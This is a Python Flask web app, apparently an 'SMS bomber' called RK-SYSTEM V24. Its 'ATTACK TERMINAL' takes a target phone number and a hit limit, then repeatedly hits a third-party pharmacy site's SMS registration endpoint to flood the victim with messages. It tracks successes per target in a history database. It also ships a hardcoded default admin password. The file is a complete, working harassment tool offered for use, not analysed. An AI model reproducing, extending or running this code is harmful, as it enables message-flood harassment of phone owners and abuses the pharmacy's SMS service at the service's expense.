import requests
import threading
import os
import time
import sqlite3
import random
from datetime import datetime, timedelta, timezone
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = os.urandom(32)

# ---------- [FEATURE: BST BD TIME ZONE] ----------
def get_bd_time():
    return datetime.now(timezone(timedelta(hours=6)))

# ---------- [DATABASE SETUP] ----------
def get_db():
    conn = sqlite3.connect('rk_v24_premium.db', check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS history (
            id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, phone TEXT, 
            success INTEGER, fail INTEGER, total INTEGER, limit_amt INTEGER, 
            status TEXT, start_time TEXT, stop_time TEXT, duration TEXT, 
            date_str TEXT, timestamp DATETIME)''')
        conn.execute("CREATE TABLE IF NOT EXISTS users (username TEXT UNIQUE, password TEXT, status TEXT)")
        # Default Admin Account
        try:
            conn.execute("INSERT INTO users VALUES (?, ?, ?)", ("admin", generate_password_hash("JaNiNaTo-330"), "active"))
        except: pass

init_db()

# ---------- [CORE TURBO ENGINE] ----------
active_sessions = {}

def send_request(phone):
    api_list = ["https://shop.pharmaid-rx.com/api/sendSMSRegistration?mobileNumber={}"]
    try:
        res = requests.get(random.choice(api_list).format(phone), timeout=6)
        return res.status_code == 200
    except: return False

def bombing_task(username, phone, limit, start_dt):
    key = f"{username}_{phone}"
    with ThreadPoolExecutor(max_workers=5) as executor:
        while key in active_sessions:
            curr = active_sessions[key]
            if curr['total'] >= curr['limit'] or curr['status'] == 'Stopped': break
            if curr['status'] == 'Running':
                now = get_bd_time()
                elapsed = now - start_dt
                active_sessions[key]['running_time'] = str(elapsed).split('.')[0]
                if executor.submit(send_request, phone).result():
                    active_sessions[key]['success'] += 1
                else: active_sessions[key]['fail'] += 1
                active_sessions[key]['total'] += 1
                if active_sessions[key]['total'] > 1:
                    avg = elapsed.total_seconds() / active_sessions[key]['total']
                    active_sessions[key]['eta'] = str(timedelta(seconds=int(avg * (limit - active_sessions[key]['total']))))
                time.sleep(0.15)
            else: time.sleep(1)

    stop_dt = get_bd_time()
    s = active_sessions.get(key)
    if s and s['status'] != 'Paused':
        with get_db() as conn:
            conn.execute("INSERT INTO history (username, phone, success, fail, total, limit_amt, status, start_time, stop_time, duration, date_str, timestamp) VALUES (?,?,?,?,?,?,?,?,?,?,?,?)",
                (username, phone, s['success'], s['fail'], s['total'], limit, "Completed", s['start_time'], stop_dt.strftime("%I:%M %p"), s['running_time'], start_dt.strftime("%d/%m/%Y"), start_dt))
        del active_sessions[key]

# ---------- [HACKER THEME PREMIUM UI WITH NEW FEATURES] ----------
LAYOUT = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RK-SYSTEM V24</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;500;700&family=Source+Code+Pro:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root { --neon: #00ffcc; --bg: #020202; --card: #0a0a0a; --red: #ff003c; --blue: #00d2ff; --gold: #f39c12; --purple: #9b59b6; }
        * { box-sizing: border-box; }
        body { background: var(--bg); color: #e0e0e0; font-family: 'Rajdhani', sans-serif; margin: 0; overflow-x: hidden; }
        
        /* DOOR ANIMATION */
        .loading-screen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999;
            display: flex; justify-content: center; align-items: center; background: #000;
        }
        .door-left, .door-right {
            position: absolute; top: 0; width: 50%; height: 100%; background: #050505;
            border: 1px solid var(--neon); transition: 1.5s cubic-bezier(0.7, 0, 0.3, 1);
        }
        .door-left { left: 0; border-right: 2px solid var(--neon); }
        .door-right { right: 0; border-left: 2px solid var(--neon); }
        .loaded .door-left { transform: translateX(-100%); }
        .loaded .door-right { transform: translateX(100%); }
        .loaded .loading-screen { pointer-events: none; opacity: 0; transition: 1s 1s; }

        /* RK-SYSTEM RGB BANNER */
        .rk-banner-frame {
            padding: 5px; background: #000; border-radius: 10px; margin: 20px auto;
            max-width: 90%; position: relative; overflow: hidden; border: 1px solid #222;
        }
        .rk-banner-frame::after {
            content: ""; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
            background: conic-gradient(var(--red), var(--blue), var(--neon), var(--purple), var(--red));
            animation: rotate 3s linear infinite; z-index: 1;
        }
        .rk-banner-text {
            position: relative; background: #050505; z-index: 2; border-radius: 8px;
            padding: 15px; text-align: center; font-family: 'Orbitron'; font-weight: 900;
            font-size: 2.2rem; letter-spacing: 5px; color: #fff;
            background: linear-gradient(90deg, #fff, var(--neon), #fff);
            background-size: 200% auto; -webkit-background-clip: text;
            -webkit-text-fill-color: transparent; animation: shine 3s linear infinite;
        }
        @keyframes shine { to { background-position: 200% center; } }

        /* UI STYLES */
        #canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.15; }
        .nav { background: rgba(0,0,0,0.9); padding: 15px 25px; border-bottom: 2px solid var(--neon); display: flex; justify-content: space-between; align-items: center; position: sticky; top:0; z-index:1000; }
        .container { padding: 30px 15px; max-width: 550px; margin: auto; animation: zoomIn 0.8s ease-out; }
        @keyframes zoomIn { from { transform: scale(0.5); opacity: 0; } to { transform: scale(1); opacity: 1; } }

        .monitor-frame { position: relative; background: #000; border-radius: 20px; padding: 2px; overflow: hidden; margin-bottom: 30px; }
        .monitor-frame::before { content: ""; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: conic-gradient(transparent, var(--neon), var(--blue), var(--purple), var(--neon)); animation: rotate 4s linear infinite; }
        .monitor-content { position: relative; background: var(--card); border-radius: 18px; padding: 25px; z-index: 2; }

        input { width: 100%; padding: 16px; margin: 12px 0; background: #000; border: 1px solid #222; color: var(--neon); border-radius: 12px; font-family: 'Source Code Pro'; outline: none; border-left: 4px solid var(--neon); }
        .btn-turbo { background: linear-gradient(135deg, var(--neon), var(--blue)); color: #000; border: none; padding: 18px; width: 100%; border-radius: 12px; font-family: 'Orbitron'; font-weight: 900; cursor: pointer; text-transform: uppercase; }
        
        /* PASSWORD SHOW/HIDE */
        .pass-container { position: relative; }
        .toggle-pass { position: absolute; right: 15px; top: 28px; color: var(--neon); cursor: pointer; font-size: 12px; font-family: 'Orbitron'; }

        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
        .info-box { background: rgba(255,255,255,0.02); border: 1px solid #1a1a1a; padding: 15px; border-radius: 12px; text-align: center; }
        .progress-bar { height: 8px; background: #111; border-radius: 10px; margin: 20px 0; overflow: hidden; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, var(--neon), var(--blue)); transition: 0.5s; }
        
        .menu-dropdown { position: absolute; right: 20px; top: 75px; background: var(--card); border: 1px solid var(--neon); border-radius: 8px; width: 240px; display: none; z-index: 2000; }
        .menu-dropdown a { display: block; padding: 15px 20px; color: #fff; text-decoration: none; font-size: 10px; border-bottom: 1px solid #1a1a1a; }
        
        .footer-credit { text-align: center; padding: 40px; font-family: 'Orbitron'; font-size: 10px; color: #444; }
        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        .c-neon { color: var(--neon); } .c-blue { color: var(--blue); } .c-red { color: var(--red); }
    </style>
</head>
<body onload="document.body.classList.add('loaded')">
    <div class="loading-screen">
        <div class="door-left"></div>
        <div class="door-right"></div>
        <div style="z-index: 10000; font-family: 'Orbitron'; color: var(--neon); text-shadow: 0 0 10px var(--neon);">SYSTEM LOADING...</div>
    </div>

    <canvas id="canvas"></canvas>
    
    <div class="rk-banner-frame">
        <div class="rk-banner-text">RK-SYSTEM</div>
    </div>

    <nav class="nav">
        <div class="logo" style="font-family:Orbitron; color:var(--neon);" onclick="location.href='/dashboard'">RK-SYSTEM V24</div>
        <div style="cursor:pointer;" onclick="let m=document.getElementById('mBox'); m.style.display=(m.style.display==='block'?'none':'block')">
            <span style="height:4px; width:4px; background:var(--neon); display:block; margin:3px;"></span>
            <span style="height:4px; width:4px; background:var(--neon); display:block; margin:3px;"></span>
            <span style="height:4px; width:4px; background:var(--neon); display:block; margin:3px;"></span>
        </div>
    </nav>

    <div class="menu-dropdown" id="mBox">
        <a href="/history">01. ALL HISTORY</a>
        <a href="/running-logs">02. RUNNING MISSIONS</a>
        <a href="/profile">03. PROFILES</a>
        <a href="/logout" style="color:var(--red);">!! LOGOUT</a>
    </div>

    <div class="container">[CONTENT]</div>

    <div class="footer-credit">CREATED BY <b>RK-SYSTEM</b> 2026</div>

    <script>
        // MATRIX BACKGROUND
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        const drops = Array(Math.floor(canvas.width/14)).fill(1);
        function draw() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#00ffcc'; ctx.font = '14px Orbitron';
            drops.forEach((y, i) => {
                const text = letters[Math.floor(Math.random()*letters.length)];
                ctx.fillText(text, i*14, y*14);
                if(y*14 > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            });
        } setInterval(draw, 50);

        function togglePassword() {
            let p = document.getElementById('passInput');
            p.type = p.type === 'password' ? 'text' : 'password';
        }
    </script>
</body></html>
'''

# ---------- [ROUTES] ----------
@app.route('/')
def root(): return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        u, p = request.form.get('u'), request.form.get('p')
        with get_db() as conn:
            user = conn.execute("SELECT * FROM users WHERE username=?", (u,)).fetchone()
        if user and check_password_hash(user['password'], p):
            session['user'] = u; return redirect(url_for('dashboard'))
    
    login_html = '''
    <div class="monitor-frame"><div class="monitor-content" style="text-align:center;">
        <h3 class="c-neon">AUTHENTICATION</h3>
        <form method="POST">
            <input name="u" placeholder="Operator ID" required>
            <div class="pass-container">
                <input name="p" id="passInput" type="password" placeholder="Access Key" required>
                <span class="toggle-pass" onclick="togglePassword()">SHOW</span>
            </div>
            <button class="btn-turbo">AUTH & LOGIN</button>
        </form>
        <p style="font-size:12px; margin-top:20px;">New Operator? <a href="/register" class="c-blue" style="text-decoration:none;">Create Account</a></p>
    </div></div>'''
    return render_template_string(LAYOUT.replace('[CONTENT]', login_html))

@app.route('/register', methods=['GET', 'POST'])
def register():
    msg = ""
    if request.method == 'POST':
        u, p = request.form.get('u'), request.form.get('p')
        with get_db() as conn:
            try:
                conn.execute("INSERT INTO users VALUES (?, ?, ?)", (u, generate_password_hash(p), "active"))
                return redirect(url_for('login'))
            except: msg = "Username already exists!"
    
    reg_html = f'''
    <div class="monitor-frame"><div class="monitor-content" style="text-align:center;">
        <h3 class="c-blue">NEW REGISTRATION</h3>
        <p class="c-red">{msg}</p>
        <form method="POST">
            <input name="u" placeholder="Choose Operator ID" required>
            <input name="p" type="password" placeholder="Set Access Key" required>
            <button class="btn-turbo">CREATE ACCOUNT</button>
        </form>
        <p style="font-size:12px; margin-top:20px;"><a href="/login" class="c-neon" style="text-decoration:none;">Back to Login</a></p>
    </div></div>'''
    return render_template_string(LAYOUT.replace('[CONTENT]', reg_html))

@app.route('/dashboard')
def dashboard():
    if 'user' not in session: return redirect(url_for('login'))
    dash_content = '''
    <div class="monitor-frame"><div class="monitor-content">
        <h3 class="c-neon">🚀 ATTACK TERMINAL</h3>
        <form action="/api/start">
            <input name="num" type="tel" inputmode="numeric" pattern="[0-9]*" placeholder="Target Number (Ex: 017...)" autocomplete="on" required>
            <input name="amt" type="number" inputmode="numeric" placeholder="Hit Limit (Ex: 100)" required>
            <button class="btn-turbo">EXECUTE MISSION</button>
        </form>
    </div></div><div id="live-engine"></div>
    <script>
        function sync() {
            let area = document.getElementById('live-engine'); if(!area) return;
            fetch('/api/status').then(r=>r.json()).then(data=>{
                let html = '';
                for(let k in data){
                    let s = data[k]; let p = (s.total/s.limit)*100;
                    html += `<div class="monitor-frame"><div class="monitor-content">
                        <b class="c-blue">TARGET: ${s.phone}</b> [${s.status}]
                        <div class="progress-bar"><div class="progress-fill" style="width:${p}%"></div></div>
                        <div class="info-grid">
                            <div class="info-box"><span>SUCCESS</span><br><b class="c-neon">${s.success}</b></div>
                            <div class="info-box"><span>FAIL</span><br><b class="c-red">${s.fail}</b></div>
                        </div>
                        <button class="btn-turbo" style="padding:10px; margin-top:10px; background:var(--red);" onclick="location.href='/api/stop?num=${s.phone}'">TERMINATE</button>
                    </div></div>`;
                } area.innerHTML = html;
            });
        } setInterval(sync, 1500);
    </script>'''
    return render_template_string(LAYOUT.replace('[CONTENT]', dash_content))

# --- Keep all your other API routes (history, status, start, stop, etc.) exactly same as your original script ---
@app.route('/history')
def history():
    if 'user' not in session: return redirect(url_for('login'))
    with get_db() as conn: logs = conn.execute("SELECT phone, COUNT(*) as sessions, SUM(success) as total_ok FROM history GROUP BY phone ORDER BY id DESC").fetchall()
    html = '<h3 class="c-blue">📂 DATABASE HISTORY</h3>'
    for l in logs:
        html += f'<div class="monitor-frame" onclick="location.href=\'/history/{l["phone"]}\'"><div class="monitor-content" style="cursor:pointer; display:flex; justify-content:space-between; align-items:center;"><div style="font-family:Orbitron;"><b class="c-gold">{l["phone"]}</b><br><small style="color:#666;">Sessions: {l["sessions"]}</small></div><div class="c-neon" style="font-size:1.2rem; font-weight:bold;">{l["total_ok"]} <span style="font-size:10px; color:#555;">OK</span></div></div></div>'
    return render_template_string(LAYOUT.replace('[CONTENT]', html))

@app.route('/api/start')
def api_start():
    u, num, amt = session.get('user'), request.args.get('num'), request.args.get('amt')
    if u and num and amt:
        now = get_bd_time(); key = f"{u}_{num}"
        active_sessions[key] = {'phone': num, 'success': 0, 'fail': 0, 'total': 0, 'limit': int(amt), 'status': 'Running', 'start_time': now.strftime("%I:%M %p"), 'running_time': '0:00:00', 'eta': 'Calculating...'}
        threading.Thread(target=bombing_task, args=(u, num, int(amt), now), daemon=True).start()
    return redirect(url_for('dashboard'))

@app.route('/api/status')
def api_status(): return jsonify({k: v for k, v in active_sessions.items() if k.startswith(session.get('user', ''))})

@app.route('/api/stop')
def api_stop():
    key = f"{session['user']}_{request.args.get('num')}"
    if key in active_sessions: active_sessions[key]['status'] = 'Stopped'
    return redirect(url_for('dashboard'))

@app.route('/profile')
def profile():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template_string(LAYOUT.replace('[CONTENT]', f'<div class="monitor-frame"><div class="monitor-content"><h3>OPERATOR: {session["user"]}</h3><button class="btn-turbo" onclick="location.href=\'/logout\'">LOGOUT SYSTEM</button></div></div>'))

@app.route('/logout')
def logout(): session.clear(); return redirect(url_for('login'))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=54300)
